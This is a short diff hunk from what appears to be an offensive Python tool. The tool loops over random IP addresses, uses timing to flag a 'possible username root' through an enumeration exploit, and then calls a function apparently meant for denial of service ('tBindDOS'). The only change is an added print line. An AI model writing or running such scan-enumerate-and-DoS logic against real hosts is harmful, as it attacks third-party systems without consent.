@@ -211,6 +211,7 @@ for address in randip():
 					endtime=time.clock()
 					f.append(address)
 					total=endtime-starttime
+					print('Possible username root based on enumeration exploit...')
 					print(total)
 					tBindDOS()
 			except socket.timeout:
